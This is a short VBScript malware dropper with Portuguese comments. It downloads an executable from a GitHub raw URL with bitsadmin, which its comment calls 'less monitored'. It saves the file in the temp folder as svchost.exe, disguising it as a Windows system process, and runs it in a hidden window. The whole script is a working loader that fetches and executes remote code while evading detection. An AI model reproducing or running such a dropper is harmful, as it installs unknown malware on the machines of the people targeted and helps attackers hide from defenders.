Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.ServerXMLHTTP")

' URL do payload real (ofuscado)
payloadUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/X7kL9mQ2vR.exe"
tempPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\svchost.exe"

' Baixa usando bitsadmin (menos monitorado)
cmd = "bitsadmin /transfer myJob /download /priority high " & payloadUrl & " " & tempPath
shell.Run cmd, 0, True

' Executa e limpa
shell.Run tempPath, 0, False
